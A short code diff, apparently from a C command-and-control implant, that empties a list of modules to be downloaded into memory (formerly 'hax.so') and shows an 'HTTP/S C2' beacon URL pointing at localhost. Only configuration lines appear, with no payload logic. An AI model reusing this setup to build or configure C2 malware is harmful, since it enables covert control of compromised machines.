@@ -26,7 +26,8 @@ int  logquiet = 1;                         // 1 - no stderr whatsoever, 0 - stde
 FILE *fp;
 
 // Initial modules to download to memory
-char *modules[] = { "hax.so" };
+// char *modules[] = { "hax.so" };
+char *modules[] = { };
 
 // HTTP/S C2
 char *ccurl="http://127.0.0.1:8080/";
